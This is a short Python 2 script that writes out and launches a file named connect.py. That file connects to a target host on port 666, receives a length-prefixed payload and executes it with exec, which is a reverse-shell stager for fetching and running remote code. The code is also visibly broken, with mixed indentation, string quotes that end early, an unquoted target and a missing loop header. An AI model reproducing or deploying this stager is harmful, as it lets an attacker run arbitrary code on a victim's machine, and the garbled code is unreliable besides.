import socket,struct,os

target = "127.0.0.1"

def ran():
	l = open('connect.py','w')
        l.write('import socket,struct\n')
	l.write('\n')
	l.write('s=socket.socket(2,socket.SOCK_STREAM)\n')
	l.write('s.connect(('+target+',666))\n')
	l.write('l=struct.unpack('>I',s.recv(4))[0]\n')
	l.write('d=s.recv(l)\n')
	l.write('	d+=s.recv(l-len(d))\n')
	l.write('exec(d,{'s':s})\n')
	l.close()
        print "[ + ] Connection [ + ]"
	os.system("python connect.py")
